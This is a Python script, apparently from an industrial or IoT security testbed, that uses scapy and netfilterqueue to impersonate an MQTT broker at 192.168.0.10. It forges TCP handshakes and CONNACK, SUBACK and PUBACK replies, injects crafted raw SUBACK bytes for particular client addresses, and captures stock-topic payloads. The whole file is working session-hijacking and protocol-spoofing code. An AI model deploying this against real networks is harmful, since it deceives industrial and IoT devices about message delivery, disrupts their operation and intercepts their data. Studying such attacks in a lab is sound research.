from scapy.contrib import mqtt
from scapy import all as scapy
import json
import netfilterqueue
import logging
import random

import globs


def extract_packet_attributes(scapy_packet, has_mqtt=True):
    # print("Extract Attribs")
    """Function to extract real time dynamic info/attr from IP, TCP, MQTT layers
     Info such as ip src & dst, TCP src & dst, TCP seq & ack, MQTT msg ID
     """
    src_ip = scapy_packet[scapy.IP].src
    dst_ip = scapy_packet[scapy.IP].dst
    src_port = int(scapy_packet[scapy.TCP].sport)
    dst_port = int(scapy_packet[scapy.TCP].dport)
    tcp_seq = int(scapy_packet[scapy.TCP].seq)
    tcp_ack = int(scapy_packet[scapy.TCP].ack)
    tcp_payload_len = len(bytes(scapy_packet[scapy.TCP].payload))  # the tcp paylod len is equivalent to len of entire MQTT packet
    mqtt_msgid = None

    if has_mqtt is True:
        try:
            mqtt_msgid = int(scapy_packet[mqtt.MQTTPublish].msgid)
        except IndexError:
            mqtt_msgid = int(scapy_packet[mqtt.MQTTSubscribe].msgid)


    return [src_ip, dst_ip, src_port, dst_port, tcp_seq, tcp_ack, tcp_payload_len, mqtt_msgid]


def packet_process(packet):

    scapy_packet = scapy.IP(packet.get_payload())
    # scapy_packet.show()

    if scapy_packet[scapy.IP].dst == "192.168.0.10" and scapy_packet[scapy.IP].dport == 1883 and scapy_packet[scapy.TCP].flags == "S":
        # what to do to sync packets
        # print("TCP S packet received")
        packet_attr = extract_packet_attributes(scapy_packet, False)
        src_ip, dst_ip, src_port, dst_port, tcp_seq, tcp_ack, tcp_payload_len, _ = packet_attr
        # tcp_ack = random.randint(1111111111,2222222222)
        tcp_ack = random.randint(0, 2**32 - 1)
        tcp3way_ack_resp = scapy.IP(src=dst_ip, dst=src_ip) / scapy.TCP(sport=dst_port, dport=src_port, seq=tcp_ack, ack=tcp_seq+1, flags="SA")
        scapy.send(tcp3way_ack_resp)
        # print("TCP Ack sent for 3way")

    elif scapy_packet[scapy.IP].dst == "192.168.0.10" and scapy_packet[scapy.IP].dport == 1883 and scapy_packet.haslayer(mqtt.MQTTConnect):
        packet_attr = extract_packet_attributes(scapy_packet, False)
        src_ip, dst_ip, src_port, dst_port, tcp_seq, tcp_ack, tcp_payload_len, _ = packet_attr

        forged_tcp_ack = scapy.IP(src=dst_ip, dst=src_ip) / scapy.TCP(sport=dst_port, dport=src_port, seq=tcp_ack, ack=tcp_seq + tcp_payload_len, flags="A")
        scapy.send(forged_tcp_ack)

        # Send a forged PUBACK to sender
        forged_mqtt_resp = scapy.IP(src=dst_ip, dst=src_ip) / scapy.TCP(sport=dst_port, dport=src_port, seq=tcp_ack,
                                                                        ack=tcp_seq + tcp_payload_len,
                                                                        flags="PA") / mqtt.MQTT(
            type=2) / mqtt.MQTTConnack()
        scapy.send(forged_mqtt_resp)
        # print("Forged packet sent for ConnAck")

    elif scapy_packet[scapy.IP].dst == "192.168.0.10" and scapy_packet[scapy.IP].dport == 1883 and scapy_packet.haslayer(
            mqtt.MQTTSubscribe):
        packet_attr = extract_packet_attributes(scapy_packet, True)
        src_ip, dst_ip, src_port, dst_port, tcp_seq, tcp_ack, tcp_payload_len, mqtt_msgid = packet_attr

        forged_tcp_ack = scapy.IP(src=dst_ip, dst=src_ip) / scapy.TCP(sport=dst_port, dport=src_port, seq=tcp_ack,
                                                                      ack=tcp_seq + tcp_payload_len, flags="A")
        scapy.send(forged_tcp_ack)

        if mqtt_msgid == 1:


            forged_mqtt_resp = scapy.IP(src=dst_ip, dst=src_ip) / scapy.TCP(sport=dst_port, dport=src_port, seq=tcp_ack,
                                                                            ack=tcp_seq + tcp_payload_len,
                                                                            flags="PA") / mqtt.MQTT(
                type=9, QOS=1) / mqtt.MQTTSuback(msgid=1)
            scapy.send(forged_mqtt_resp)


        elif src_ip == "192.168.0.13":
            raw_mqtt_load = "90 03 00 02 01 90 03 00 03 01 90 03 00 04 01 90 03 00 05 01 90 03 00 06 01 90 03 00 07 01 40 02 00 08"
            raw_mqtt_load = bytes.fromhex(raw_mqtt_load)

            forged_mqtt_resp = scapy.IP(src=dst_ip, dst=src_ip) / scapy.TCP(sport=dst_port, dport=src_port, seq=tcp_ack,
                                                                            ack=tcp_seq + tcp_payload_len,
                                                                            flags="PA") / scapy.Raw(load=raw_mqtt_load)
            scapy.send(forged_mqtt_resp)

        elif src_ip == "192.168.0.12":
            raw_mqtt_load = "90 03 00 02 01 90 03 00 03 01"
            raw_mqtt_load = bytes.fromhex(raw_mqtt_load)
            forged_mqtt_resp = scapy.IP(src=dst_ip, dst=src_ip) / scapy.TCP(sport=dst_port, dport=src_port, seq=tcp_ack,
                                                                            ack=tcp_seq + tcp_payload_len,
                                                                            flags="PA") / scapy.Raw(load=raw_mqtt_load)
            scapy.send(forged_mqtt_resp)
            # print("Forged packet sent for SubAck")

    elif scapy_packet[scapy.IP].dst == "192.168.0.10" and scapy_packet[scapy.IP].dport == 1883 and scapy_packet.haslayer(mqtt.MQTTPublish):

        packet_attr = extract_packet_attributes(scapy_packet, True)
        src_ip, dst_ip, src_port, dst_port, tcp_seq, tcp_ack, tcp_payload_len, mqtt_msgid = packet_attr

        # send tcp ack
        forged_tcp_ack = scapy.IP(src=dst_ip, dst=src_ip) / scapy.TCP(sport=dst_port, dport=src_port, seq=tcp_ack, ack=tcp_seq+tcp_payload_len, flags="A")
        scapy.send(forged_tcp_ack)

        # Send a forged PUBACK to sender
        forged_mqtt_resp = scapy.IP(src=dst_ip, dst=src_ip) / scapy.TCP(sport=dst_port, dport=src_port, seq=tcp_ack, ack=tcp_seq+tcp_payload_len, flags="PA") / mqtt.MQTT(
            type=4, QOS=1) / mqtt.MQTTPuback(msgid=mqtt_msgid)
        scapy.send(forged_mqtt_resp)
        # print("Forged packet sent for PubAck")


        # check if the packet has PUBLISH packets of interest
        topic = scapy_packet[mqtt.MQTTPublish].topic
        value = scapy_packet[mqtt.MQTTPublish].value

        if topic == b"f/i/stock":
            # print("Stock received")
            stock_payload = value.decode("utf-8", "ignore")
            try:
                stock_payload = json.loads(stock_payload)
                globs.hbw_stock = value
            except json.decoder.JSONDecodeError as error:
                print(value)
                print(error)

        # if topic == b"f/i/state/hbw" or topic == b"f/i/stock" or topic == b"fl/hbw/ack":  # fl/hbw/ack never occurs though
        #     print("state/hbw or i/stock detected")
        #     packet.accept()




    elif scapy_packet[scapy.IP].dst == "192.168.0.10" and scapy_packet[scapy.IP].dport == 1883 and scapy_packet.haslayer(mqtt.MQTTPuback):

        packet_attr = extract_packet_attributes(scapy_packet, False)
        src_ip, dst_ip, src_port, dst_port, tcp_seq, tcp_ack, tcp_payload_len, mqtt_msgid = packet_attr

        # send tcp ack
        forged_tcp_ack = scapy.IP(src=dst_ip, dst=src_ip) / scapy.TCP(sport=dst_port, dport=src_port, seq=tcp_ack,
                                                                      ack=tcp_seq+tcp_payload_len, flags="A")
        scapy.send(forged_tcp_ack)

    else:
        pass


# ss = netfilterqueue.NetfilterQueue()
# ss.bind(22, packet_process)
# ss.run()